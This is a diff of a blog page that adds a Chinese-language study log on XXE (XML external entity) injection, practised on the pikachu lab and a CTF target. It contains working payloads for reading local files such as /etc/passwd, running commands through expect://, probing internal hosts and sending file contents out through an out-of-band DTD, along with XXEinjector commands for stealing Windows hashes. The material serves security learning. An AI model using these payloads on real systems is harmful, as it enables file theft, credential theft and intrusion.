@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="wen安全日志-039, 爱睡懒觉的道士">
+    <meta name="keywords" content="web安全日志-039, 爱睡懒觉的道士">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>wen安全日志-039 | 爱睡懒觉的道士</title>
+    <title>web安全日志-039 | 爱睡懒觉的道士</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -324,12 +324,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">wen安全日志-039</h1>
+                    <h1 class="description center-align post-title">web安全日志-039</h1>
                 </div>
             </div>
         </div>
@@ -443,9 +443,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -466,14 +470,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    1.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    7 分
                 </div>
                 
 
@@ -493,7 +497,170 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="WEB漏洞-XXE-XML之利用检测绕过全解"><a href="#WEB漏洞-XXE-XML之利用检测绕过全解" class="headerlink" title="WEB漏洞-XXE&amp;XML之利用检测绕过全解"></a><font size="6"><strong>WEB漏洞-XXE&amp;XML之利用检测绕过全解</strong></font></h2><span id="more"></span>
+
+<h3 id="一、思维导图"><a href="#一、思维导图" class="headerlink" title="一、思维导图"></a><font size="5"><strong>一、思维导图</strong></font></h3><p><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/1.png"></p>
+<h3 id="二、基础概念"><a href="#二、基础概念" class="headerlink" title="二、基础概念"></a><font size="5"><strong>二、基础概念</strong></font></h3><h4 id="1、xml基础概念"><a href="#1、xml基础概念" class="headerlink" title="1、xml基础概念"></a><font size="4"><strong>1、xml基础概念</strong></font></h4><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>
+<h4 id="2、XML与HTML的主要差异"><a href="#2、XML与HTML的主要差异" class="headerlink" title="2、XML与HTML的主要差异"></a><font size="4"><strong>2、XML与HTML的主要差异</strong></font></h4><p>XML被设计为传输和存储数据，其焦点是数据的内容。<br>HTML被设计用来显示数据，其焦点是数据的外观。<br>HTML旨在显示信息，而XML旨在传输信息。</p>
+<h4 id="3、xml示例"><a href="#3、xml示例" class="headerlink" title="3、xml示例"></a><font size="4"><strong>3、xml示例</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>--文档类型定义--<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE note <span class="token punctuation">[</span>	<span class="token operator">&lt;</span><span class="token operator">!</span>--定义此文档时note类型的文档--<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>ELEMENT note <span class="token punctuation">(</span>to,from,heading,body<span class="token punctuation">)</span><span class="token operator">></span>	<span class="token operator">&lt;</span><span class="token operator">!</span>--定义note元素有四个元素--<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>ELEMENT to <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#PCDATA)>			&lt;!--定义to元素为"#PCDATA"类型--></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>ELEMENT from <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#PCDATA)>		&lt;!--定义from元素为"#PCDATA"类型--></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>ELEMENT <span class="token function">head</span> <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#PCDATA)>		&lt;!--定义head元素为"#PCDATA"类型--></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>ELEMENT body <span class="token punctuation">(</span><span class="token comment" spellcheck="true">#PCDATA)>		&lt;!--定义body元素为"#PCDATA"类型--></span>
+<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">></span>
+
+<span class="token operator">&lt;</span><span class="token operator">!</span>--文档元素--<span class="token operator">></span>
+<span class="token operator">&lt;</span>note<span class="token operator">></span>
+    <span class="token operator">&lt;</span>to<span class="token operator">></span>Dave<span class="token operator">&lt;</span>/to<span class="token operator">></span>
+    <span class="token operator">&lt;</span>from<span class="token operator">></span>Tom<span class="token operator">&lt;</span>/from<span class="token operator">></span>
+    <span class="token operator">&lt;</span>head<span class="token operator">></span>Reminder<span class="token operator">&lt;</span>/head<span class="token operator">></span>
+    <span class="token operator">&lt;</span>body<span class="token operator">></span>You are a good man<span class="token operator">&lt;</span>/body<span class="token operator">></span>
+<span class="token operator">&lt;</span>/note<span class="token operator">></span>
+</code></pre>
+<h3 id="三、演示案例"><a href="#三、演示案例" class="headerlink" title="三、演示案例"></a><font size="5"><strong>三、演示案例</strong></font></h3><h4 id="1、pikachu靶场XML"><a href="#1、pikachu靶场XML" class="headerlink" title="1、pikachu靶场XML"></a><font size="4"><strong>1、pikachu靶场XML</strong></font></h4><p>-回显，玩法，协议，引入<br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/2.png"></p>
+<p>● 打开靶场<br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/3.png"></p>
+<p><font color=red>● 文件读取</font></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version <span class="token operator">=</span> <span class="token string">"1.0"</span>?<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE ANY <span class="token punctuation">[</span>
+        <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">"file:///d://test.txt"</span><span class="token operator">></span>
+<span class="token punctuation">]</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>x<span class="token operator">></span><span class="token operator">&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/x<span class="token operator">></span>
+</code></pre>
+<p><strong>备注：</strong>前提条件是有那个文件<br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/4.png"></p>
+<p><font color=red>● 玩法-内网探针或攻击内网应用（触发漏洞地址）</font></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version <span class="token operator">=</span> <span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE foo <span class="token punctuation">[</span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>ELEMENT foo ANY <span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>ENTYTY rabbit SYSTEM <span class="token string">"http://192.168.1.4:80/index.txt"</span><span class="token operator">></span>
+<span class="token punctuation">]</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>x<span class="token operator">></span><span class="token operator">&amp;</span>rabbit<span class="token punctuation">;</span><span class="token operator">&lt;</span>/x<span class="token operator">></span>
+</code></pre>
+<p>上面的ip地址假设就是内网的一台服务器的ip地址。还可以进行一个端口扫描，看一下端口是否开放。\</p>
+<p><font color=red>● 玩法-RCE</font><br>该CASE是在安装expect扩展的PHP环境里执行系统命令</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version <span class="token operator">=</span> <span class="token string">"1.0"</span>?<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE ANY <span class="token punctuation">[</span>
+        <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">"expect://id"</span><span class="token operator">></span>
+<span class="token punctuation">]</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>x<span class="token operator">></span><span class="token operator">&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/x<span class="token operator">></span>
+</code></pre>
+<p>id是对于的执行的命令。实战情况比较难碰到。<br><font color=red>● 引入外部实体DTD</font></p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version <span class="token operator">=</span> <span class="token string">"1.0"</span>?<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE <span class="token function">test</span> <span class="token punctuation">[</span>
+        <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY % <span class="token function">file</span> SYSTEM <span class="token string">"http://127.0.0.1/evil2.dtd"</span><span class="token operator">></span>
+        %file<span class="token punctuation">;</span>
+<span class="token punctuation">]</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>x<span class="token operator">></span><span class="token operator">&amp;</span>send<span class="token punctuation">;</span><span class="token operator">&lt;</span>/x<span class="token operator">></span>
+
+//下面的是写入文件的
+evil2.dtd:
+<span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY send SYSTEM <span class="token string">"file:///d:/test.txt"</span><span class="token operator">></span>
+</code></pre>
+<p><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/5.png"><br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/6.png"></p>
+<p>条件：看对方的应用有没有禁用外部实体引用，这也是防御XXE的一种措施。<br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/7.png"></p>
+<p>● 无回显-读取文件</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml version <span class="token operator">=</span> <span class="token string">"1.0"</span>?<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE <span class="token function">test</span> <span class="token punctuation">[</span>
+        <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY % <span class="token function">file</span> SYSTEM <span class="token string">"php://filter/read=convert.base64-encode/resource=d:/test.txt"</span><span class="token operator">></span>
+        <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY % dtd SYSTEM <span class="token string">"http://192.168.xx.xxx:80XX/test.dtd"</span><span class="token operator">></span>
+        %dtd<span class="token punctuation">;</span>
+        %send<span class="token punctuation">;</span>
+<span class="token punctuation">]</span><span class="token operator">></span>
+
+
+test.dtd:
+<span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY % payload
+    <span class="token string">"&lt;!ENTITY &amp;#x25; send SYSTEM
+'http://192.168.xx.xxx:80xx/?data=%file;'>"</span>
+<span class="token operator">></span>
+%payload<span class="token punctuation">;</span>
+</code></pre>
+<p>上面的url一般是自己的网站，通过第一步访问文件，然后再访问dtd文件，把读取到的数据赋给data，然后我们只需要再自己的网站日志，或者写个php脚本保存下来，就能看到读取到的文件数据了。</p>
+<h3 id="四、xxe绕过"><a href="#四、xxe绕过" class="headerlink" title="四、xxe绕过"></a><font size="5"><strong>四、xxe绕过</strong></font></h3><pre class=" language-bash"><code class="language-bash">https://www.cnblogs.com/20175211lyz/p/11413335.html
+</code></pre>
+<h3 id="五、xxe靶场"><a href="#五、xxe靶场" class="headerlink" title="五、xxe靶场"></a><font size="5"><strong>五、xxe靶场</strong></font></h3><h4 id="1、xxe-lab"><a href="#1、xxe-lab" class="headerlink" title="1、xxe-lab"></a><font size="4"><strong>1、xxe-lab</strong></font></h4><pre class=" language-bash"><code class="language-bash">https://github.com/c0ny1/xxe-lab
+</code></pre>
+<p><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/8.png"><br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/9.png"></p>
+<p><strong>备注：</strong>不知道是啥子原因这个位置发送的数据包不是xml格式导致漏洞无法利用，在这里卡了很久，有知道解决办法再说吧</p>
+<h4 id="2、CTF-Jarvis-OJ-Web-XXE"><a href="#2、CTF-Jarvis-OJ-Web-XXE" class="headerlink" title="2、CTF-Jarvis-OJ-Web-XXE"></a><font size="4"><strong>2、CTF-Jarvis-OJ-Web-XXE</strong></font></h4><pre class=" language-bash"><code class="language-bash">http://web.jarvisoj.com:9882/
+更改请求数据格式:c
+
+<span class="token operator">&lt;</span>?xml version<span class="token operator">=</span> <span class="token operator">=</span> <span class="token string">"1.0"</span>? <span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE ANY <span class="token punctuation">[</span>
+    <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY f SYSTEM <span class="token string">"file:///etc/passwd"</span><span class="token operator">></span>
+<span class="token punctuation">]</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>x<span class="token operator">></span><span class="token operator">&amp;</span>f<span class="token punctuation">;</span><span class="token operator">&lt;</span>/x<span class="token operator">></span>
+</code></pre>
+<p>点击Go，抓包<br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/10.png"></p>
+<p>数据传输形式是采用json数据格式来提交传输的。通过修改数据格式来攻击，形成XXE漏洞。<br><img src="/2023/10/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-039/11.png"></p>
+<h3 id="六、xxe工具"><a href="#六、xxe工具" class="headerlink" title="六、xxe工具"></a><font size="5"><strong>六、xxe工具</strong></font></h3><p>XXEinjector本身提供了非常非常丰富的操作选项，所以大家在利用XXEinjector进行渗透测试之前，请自习了解这些配置选项，以最大限度地发挥XXEinjector的功能。当然了，由于XXEinjector是基于Ruby开发的，所以Ruby运行环境就是必须的了。这里建议在kali环境下运行。</p>
+<h4 id="1、获取地址"><a href="#1、获取地址" class="headerlink" title="1、获取地址"></a><font size="4"><strong>1、获取地址</strong></font></h4><pre class=" language-bash"><code class="language-bash">这里也给出github地址：https://github.com/enjoiz/XXEinjector
+https://github.com/enjoiz/XXEinjector/archive/master.zip
+</code></pre>
+<h4 id="2、参数说明"><a href="#2、参数说明" class="headerlink" title="2、参数说明"></a><font size="4"><strong>2、参数说明</strong></font></h4><pre class=" language-bash"><code class="language-bash">--host     			必填项– 用于建立反向链接的IP地址。<span class="token punctuation">(</span>--host<span class="token operator">=</span>192.168.0.2<span class="token punctuation">)</span>
+--file      		必填项- 包含有效HTTP请求的XML文件。<span class="token punctuation">(</span>--file<span class="token operator">=</span>/tmp/req.txt<span class="token punctuation">)</span>
+--path           必填项-是否需要枚举目录 – 枚举路径。<span class="token punctuation">(</span>--path<span class="token operator">=</span>/etc<span class="token punctuation">)</span>
+--brute          必填项-是否需要爆破文件 -爆破文件的路径。<span class="token punctuation">(</span>--brute<span class="token operator">=</span>/tmp/brute.txt<span class="token punctuation">)</span>
+--logger        	记录输出结果。
+--rhost          远程主机IP或域名地址。<span class="token punctuation">(</span>--rhost<span class="token operator">=</span>192.168.0.3<span class="token punctuation">)</span>
+--rport          远程主机的TCP端口信息。<span class="token punctuation">(</span>--rport<span class="token operator">=</span>8080<span class="token punctuation">)</span>
+--phpfilter    	在发送消息之前使用PHP过滤器对目标文件进行Base64编码。
+--netdoc     		使用netdoc协议。<span class="token punctuation">(</span>Java<span class="token punctuation">)</span>.
+--enumports   枚举用于反向链接的未过滤端口。<span class="token punctuation">(</span>--enumports<span class="token operator">=</span>21,22,80,443,445<span class="token punctuation">)</span>
+--hashes       窃取运行当前应用程序用户的Windows哈希。
+--expect        使用PHP expect扩展执行任意系统命令。<span class="token punctuation">(</span>--expect<span class="token operator">=</span>ls<span class="token punctuation">)</span>
+--upload       使用Java jar向临时目录上传文件。<span class="token punctuation">(</span>--upload<span class="token operator">=</span>/tmp/upload.txt<span class="token punctuation">)</span>
+--xslt      		XSLT注入测试。
+--ssl              使用SSL。
+--proxy         使用代理。<span class="token punctuation">(</span>--proxy<span class="token operator">=</span>127.0.0.1:8080<span class="token punctuation">)</span>
+--httpport 		Set自定义HTTP端口。<span class="token punctuation">(</span>--httpport<span class="token operator">=</span>80<span class="token punctuation">)</span>
+--ftpport       设置自定义FTP端口。<span class="token punctuation">(</span>--ftpport<span class="token operator">=</span>21<span class="token punctuation">)</span>
+--gopherport  设置自定义gopher端口。<span class="token punctuation">(</span>--gopherport<span class="token operator">=</span>70<span class="token punctuation">)</span>
+--jarport       设置自定义文件上传端口。<span class="token punctuation">(</span>--jarport<span class="token operator">=</span>1337<span class="token punctuation">)</span>
+--xsltport  	设置自定义用于XSLT注入测试的端口。<span class="token punctuation">(</span>--xsltport<span class="token operator">=</span>1337<span class="token punctuation">)</span>
+--test     		该模式可用于测试请求的有效。
+--urlencode     URL编码，默认为URI。
+--output       爆破攻击结果输出和日志信息。<span class="token punctuation">(</span>--output<span class="token operator">=</span>/tmp/out.txt<span class="token punctuation">)</span>
+--timeout     设置接收文件/目录内容的Timeout。<span class="token punctuation">(</span>--timeout<span class="token operator">=</span>20<span class="token punctuation">)</span>
+--contimeout  设置与服务器断开连接的，防止DoS出现。<span class="token punctuation">(</span>--contimeout<span class="token operator">=</span>20<span class="token punctuation">)</span>
+--fast     		跳过枚举询问，有可能出现结果假阳性。
+--verbose     显示verbose信息。
+</code></pre>
+<h4 id="3、工具使用"><a href="#3、工具使用" class="headerlink" title="3、工具使用"></a><font size="4"><strong>3、工具使用</strong></font></h4><p>枚举HTTPS应用程序中的&#x2F;etc目录：</p>
+<pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --path<span class="token operator">=</span>/etc --file<span class="token operator">=</span>/tmp/req.txt –ssl
+</code></pre>
+<p>使用gopher（OOB方法）枚举&#x2F;etc目录：</p>
+<pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --path<span class="token operator">=</span>/etc --file<span class="token operator">=</span>/tmp/req.txt --oob<span class="token operator">=</span>gopher
+</code></pre>
+<p>二次漏洞利用：</p>
+<pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --path<span class="token operator">=</span>/etc --file<span class="token operator">=</span>/tmp/vulnreq.txt--2ndfile<span class="token operator">=</span>/tmp/2ndreq.txt
+</code></pre>
+<p>使用HTTP带外方法和netdoc协议对文件进行爆破攻击：</p>
+<pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --brute<span class="token operator">=</span>/tmp/filenames.txt--file<span class="token operator">=</span>/tmp/req.txt --oob<span class="token operator">=</span>http –netdoc
+</code></pre>
+<p>通过直接性漏洞利用方式进行资源枚举：</p>
+<pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --file<span class="token operator">=</span>/tmp/req.txt --path<span class="token operator">=</span>/etc --direct<span class="token operator">=</span>UNIQUEMARK
+</code></pre>
+<p>枚举未过滤的端口：</p>
+<pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --file<span class="token operator">=</span>/tmp/req.txt --enumports<span class="token operator">=</span>all
+</code></pre>
+<p>窃取Windows哈希：</p>
+<pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb--host<span class="token operator">=</span>192.168.0.2 --file<span class="token operator">=</span>/tmp/req.txt –hashes
+</code></pre>
+<p>使用Java jar上传文件：</p>
+<pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --file<span class="token operator">=</span>/tmp/req.txt--upload<span class="token operator">=</span>/tmp/uploadfile.pdf
+</code></pre>
+<p>使用PHP expect执行系统指令：</p>
+<pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --file<span class="token operator">=</span>/tmp/req.txt --oob<span class="token operator">=</span>http --phpfilter--expect<span class="token operator">=</span>ls
+</code></pre>
+<p>测试XSLT注入：</p>
+<pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --host<span class="token operator">=</span>192.168.0.2 --file<span class="token operator">=</span>/tmp/req.txt –xslt
+</code></pre>
+<p>记录请求信息：</p>
+<pre class=" language-bash"><code class="language-bash">ruby XXEinjector.rb --logger --oob<span class="token operator">=</span>http--output<span class="token operator">=</span>/tmp/out.txt
+</code></pre>
+
                 
             </div>
             <hr/>
@@ -556,7 +723,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -733,15 +904,15 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="wen安全日志-039">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="web安全日志-039">
                         
-                        <span class="card-title">wen安全日志-039</span>
+                        <span class="card-title">web安全日志-039</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            WEB漏洞-XXE&amp;XML之利用检测绕过全解
                         
                     </div>
                     <div class="publish-info">
@@ -757,6 +928,14 @@
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -779,7 +958,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            WEB漏洞-反序列化之PHP&amp;JAVA全解(下)
                         
                     </div>
                     <div class="publish-info">
@@ -793,6 +972,14 @@
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -1030,7 +1217,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">55.7k</span>&nbsp;字
+                class="white-color">58.3k</span>&nbsp;字
             
             
             
